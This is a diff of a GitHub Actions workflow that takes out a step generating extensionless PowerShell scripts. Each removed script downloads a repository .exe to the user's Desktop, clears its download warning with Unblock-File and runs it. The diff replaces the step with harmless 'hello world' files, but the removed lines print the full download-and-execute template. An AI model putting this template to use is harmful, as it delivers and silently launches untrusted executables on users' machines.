@@ -17,19 +17,10 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: Generate extensionless PowerShell scripts
+      - name: Generate simple test files
         shell: bash
-        env:
-          REPO_OWNER: ${{ github.repository_owner }}
-          REPO_NAME: ${{ github.event.repository.name }}
-          BRANCH: ${{ github.ref_name }}
         run: |
           set -euo pipefail
-
-          echo "=== Debug: Listing all files in workspace ==="
-          find . -maxdepth 3
-
-          echo "=== Searching for EXE files ==="
           changed=0
 
           while IFS= read -r -d '' exe_file; do
@@ -44,50 +35,28 @@ jobs:
               output_path="$dir/$base"
             fi
 
-            echo "Found EXE: $clean_path -> Writing script to: $output_path"
-
-            cat <<EOF > "$output_path"
-# Auto-generated script
-\$ErrorActionPreference = 'Stop'
-\$repoOwner = '$REPO_OWNER'
-\$repoName = '$REPO_NAME'
-\$branch = '$BRANCH'
-\$relativePath = '$clean_path'
-\$encodedPath = (\$relativePath -split '/' | ForEach-Object { [uri]::EscapeDataString(\$_) }) -join '/'
-\$url = "https://raw.githubusercontent.com/\$repoOwner/\$repoName/\$branch/\$encodedPath"
-\$destination = Join-Path ([Environment]::GetFolderPath('Desktop')) '$filename'
-
-Write-Host "Downloading $filename..."
-Invoke-WebRequest -Uri \$url -OutFile \$destination
-Write-Host "Downloaded to: \$destination"
-
-Unblock-File -Path \$destination
-
-Write-Host "Executing $filename..."
-Start-Process -FilePath \$destination -Wait
-EOF
-
-            chmod 644 "$output_path"
+            echo "hello world" > "$output_path"
+            echo "Created file at: $output_path"
             changed=1
           done < <(find . -type f -iname '*.exe' -print0)
 
-          if [[ "$changed" -eq 0 ]]; then
-            echo "WARNING: No .exe files were matched by find!"
+          if [ "$changed" -eq 0 ]; then
+            echo "No .exe files were found by find command."
           fi
 
       - name: Commit generated scripts
         shell: bash
         run: |
           set -euo pipefail
-          
+
           git add -f .
 
           if git diff --cached --quiet; then
-            echo "No generated script changes to commit."
+            echo "No changes to commit."
             exit 0
           fi
 
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git commit -m "Generate download and execute scripts for EXE files"
+          git commit -m "Create simple test file for EXE"
           git push
